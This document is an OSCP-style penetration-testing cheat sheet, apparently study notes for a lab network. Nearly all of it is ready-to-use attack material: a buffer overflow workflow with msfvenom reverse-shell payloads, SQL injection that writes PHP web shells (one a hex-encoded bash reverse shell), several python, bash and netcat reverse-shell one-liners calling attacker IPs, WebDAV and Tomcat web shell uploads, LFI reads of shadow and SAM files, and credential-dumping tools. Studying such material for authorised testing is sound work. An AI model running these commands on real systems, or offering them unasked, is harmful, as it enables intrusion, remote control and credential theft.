OSCP Tools

Essentials Tools

netcat (nc/ncat)
Wireshark
tcpdump
check in /usr/share/windows-binaries/

Passive Information Gathering

Google Dorks
Mail Harvesting (theharvetser)
whois
recon-ng

Active Information Gathering

    dnsenum (host,dnsrecon,dnsenum)
    port scanning with nc (nc -nvv -w 1 -z 10.0.0.19 3388-3390, nc -nv -u -z -w 1 10.0.0.19 160-162)
    nmap
        nmap -n -p- -oA 10.11.1.0/24 10.11.1.0/24
        nmap -n -sV -p xx,xx,xx,xx -sC -oA 10.11.1.1 10.11.1.1
        nmap -n -sU -oA 10.11.1.x_udp 10.11.1.x
    smb enumeration 
        nmap -v -p 139,445 -oG smb.txt 10.11.1.1-254
        nbtscan -r 10.11.1.0/24
        enum4linux
        smb-os-discovery script or smb-vuln*
    smtp enumeration
        VRFY
    SNMP enumeration
        nmap -sU --open -p 161 10.11.1.1-254 -oG mega-snmp.txt
        snmpwalk
        onesixtyone
        snmpwalk -c public -v1 10.11.1.204 1.3.6.1.4.1.77.1.2.25
        snmpwalk -c public -v1 10.11.1.204  1.3.6.1.2.1.25.4.2.1.2
        snmpwalk -c public -v1 10.11.1.204 1.3.6.1.2.1.6.13.1.3
        snmpwalk -c public -v1 10.11.1.204 1.3.6.1.2.1.25.6.3.1.2
    web
        nikto
        gobuster/dirbuster and select the appropriate wordlist
        BlindElephant and other Wordpress tools for scannign
    Exploit Identification
        nmap -sV 10.11.1.0/24, check software version and identify exploit for each service
        If some services does not return version , check in wireshark if in some fields, there is a version number
    Administrative Interface Password
        check on google for default password
            FTP
            Web Products (check on google or try with simple words otrs:otrs)
            Mail Server, 
            wordpress and other CMS user bruteforce
            .....
    Vuln scanning
        nmap --script vuln/service

EternalBlue

    https://github.com/3ndG4me/AutoBlue-MS17-010
    https://github.com/worawit/MS17-010
        
        
Buffer Overflow
    First check if mingw has to be used (pay attention to the flags) or gcc
    open vulnerable software in immunity
    fuzzing and identify the vulnerable parameter
        /usr/share/metasploit-framework/tools/exploit/pattern_create.rb
    Check with which values EIP is being overwritten, then compute offset:
        /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 4000 -q 68433568
    Check if it works
        e.g: 'A' * 1050 + 'BBBB' + 'C' * 1000
        EIP should contain 'BBBB'
        To debug, put \xcc\xcc\xcc\xcc
    Check bad chars
        per default \x0a, \x00, \x0d are to be stripped.
        badchars = (
            "\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10"
            "\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
            "\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30"
            "\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
            "\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50"
            "\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"
            "\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70"
            "\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"
            "\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90"
            "\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"
            "\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0"
            "\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"
            "\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0"
            "\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"
            "\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0"
            "\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff" )
        Send 'A' * 1050 + 'BBBB' + badchars and check which ones are interpreted
        In immunity generate first bytearray (!mona bytearray)
        Then after sending the payload check the badhcars with !mona compare -f bytearray.bin -a 01473908
        The -a is the address right after the return address placed in EIP
        The if a badchar is found, remove it from mona bytearray: !mona bytearray -cpb "\x00"
        Repeat these steps until there aren't bad chars
    Check for a return address 
        !mona modules (use a dll without aslr or other protections)
        Then !mona find -s "\xff\xe4" -m slmfc.dll 
            or
        Then !mona jmp -r ESP ( to find a valid JMP instruction to use in the exploit)
        Use a return adress without badchars!
        Revert the return adress (endianness) 0xa98b3a31
        'A' * 1050 + '\x31\xa3\x8b\xa9' + 'C' * 1000 
    Generate the payload
        msfvenom --payload windows/shell_reverse_tcp lhost=192.168.83.177 lport=31337 --bad-chars '\x00\x0a\x0d' -f python
            or
        msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.145 LPORT=31337 EXITFUNC=thread -f python –e x86/shikata_ga_nai -b "\x00\x0a\x0d"
        
        Pay attention to the exitfunc (e.g. thread if is a threaded software)
        Pay attention to the encoding -e and chose the best one if one should not work
        'A' * 1050 + '\x31\xa3\x8b\xa9' + buf + 'C' * (2000-1050-4-len(buf)
    Check for NOP 
        if the payload is not aligned right after the return address you should add NOP sleds. Check in debugger how many nops you must add:
        'A' * 1050 + '\x31\xa3\x8b\xa9' + "\x90" * 12 + buf + 'C' * (2000-1050-4-len(buf)-12)      
    
    Improvements
        encoder
        exitfunc

Reverse Shell Tips
    pay attention to the OS
    use first shell_reverse_tcp and then shell/shell_reverse_tcp
    sometimes bind shell must be used
    if uploading a web shell, use the language of the platform to generate the shell (ASP/PHP/JAVA/JSP/...)
    Use low ports because high ports could be blocked by firewall (use 53, 443, 80,....)
        
Web Shell Uploads
    WebDav
        IIS
            > put shell.asp shell.txt
            > copy shell.txt shell.asp
            
            > put shell.txt shell.asp;.txt
            
            Then visit the shell.asp or shell.asp;.txt to get the shell
    Tomcat
            use the deployer and then visit for example /shell (use Java payload in msfvenom)
    SQL Injection
       
       
Web
    SQLi
        http://10.11.1.252:8000/edit_type.php?type_id=5 AND SLEEP(10) to detect blind sql injection
        http://10.11.1.252:8000/edit_type.php?type_id==1 union select "<?php system($_GET['c']);?>" into outfile '/var/www/html/shell10.php'--
        
        To execute more complex commands convert them to HEX:
        http://10.11.1.252:8000/edit_type.php?type_id=1 union select '<?php system('bash -i >& /dev/tcp/10.11.0.53/53 0>&1');?>' into outfile '/var/www/html/shell22.php'--
        http://10.11.1.252:8000/edit_type.php?type_id=1 union select 0x273c3f7068702073797374656d282762617368202d69203e26202f6465762f7463702f31302e31312e302e35332f353320303e263127293b3f3e27 into outfile '/var/www/html/shell23.php'--
        
        Or sqlmap style
        http://10.11.1.252:8000/edit_type.php?type_id=-2835 OR 5902=5092 LIMIT 0,1 INTO OUTFILE '/var/www/html/tmpkfjds.php' LINES TERMINATED BY 0x273c3f7068702073797374656d282762617368202d69203e26202f6465762f7463702f31302e31312e302e35332f353320303e263127293b3f3e27                                   

        
Web Shells
    Try simple webshells:
    <?php shell_exec("nc.exe 10.11.0.145 443 -e cmd.exe"); ?>
    Use webshell in "/usr/share/webshells"
    If webshell does not work, upload php-backdoor.php alwasy in /usr/share/webshells/php and execute this python command:
        python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.11.0.53",53));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
    Wheely
    
    python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.69.31",31337));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
    bash -i >& /dev/tcp/192.168.69.31/31337 0>&1
    perl —e 'exec "/bin/bash";'
    /usr/bin/python3.5m -c 'import pty; pty.spawn("/bin/sh")'
    /usr/bin/python3 -c 'import pty; pty.spawn("/bin/sh")'
    python -c 'import pty;pty.spawn("/bin/sh")'
    https://www.metahackers.pro/upgrade-shell-to-fully-interactive-tty-shell/
    
LFI/RFI

    LFI
        Check if it possible to upload something first
        Then call it with the LFI: www.aaa.com/alert.php?config=/var/www/html/shell.php
        Otherwise try to include local files like shadow, passwd, windows SAM and SYSTEM (from c:\windows\repair)
    RFI
        Use low ports when connecting back, high ports could be blocked
        Pay attention to the extention e.g include($param ."/inc/config.php") => can results in http://10.11.0.53:53/myfile.php/inc/config.php. Use %00 (http://10.11.0.53:53/myfile.php%00/inc/config.php) to avoid this or check in the web server which requests are being sent.
        Hosts simple shell first
      
File Transfer

    powershell -Command "&{wget "http://10.11.0.145/fgdump.exe" -outfile "fgdump.exe"}"
    C:\temp>certutil.exe -urlcache -split -f "http://10.11.0.53:8080/novell.py" novell.py
    python -m SimpleHTTPServer 80
    python -m pyftpdlib -p 60000 -w
    start atftpd on kali then tftp.exe in Windows

PrivESC


    General
        Quick overview of the environment
        Is the shell stable? Otherwise migrate
        Check writable/exectuable directories
        Dump user passwords and hash
        Look at what dynamic connections it might be making with other hosts
        Look for outstanding files in the file system
        Check software configurations
        Check for plain text password in registries.
        
    Exploit
        pyinstaller to convert python to EXEs (it creates a directory called phpmailer if the script is called phpmail.py with the exe in the dist folder)

    Linux
        Fix shell:
            CTRL+Z
            stty raw -echo
            fg
            reset
            terminal type: xterm256-color
        Or:
            /usr/bin/python -c 'import pty; pty.spawn("/bin/bash")'  
            /opt/splunk/bin/python -c 'import pty; pty.spawn("/bin/sh")' 
        basic checks: sudo -l, suid, crontab, /etc/passwd or /etc/shadow, .bash_history of all user, look in /opt/, /tmp 
        linprivchecker.py, LinEnum, unix-privesc-check, https://github.com/AlessandroZ/BeRoot, https:/gtfobins.github.io/
        check for software misconfiguration
        check for unix capabilities
        check for exploit
    
    Windows
        basic checks: whoami, net user %user% (check belonging groups)
        Sherlock, PowerUp, WinPrivCheck.bat,Windows-Exploit-Suggester, windowsEnum.bat
        check for software misconfiguration
        check for c:\windows\repair and gather the hash for password cracking
        check clear text password in registry and wce32.exe/fgdump.exe
        check for exploit
        
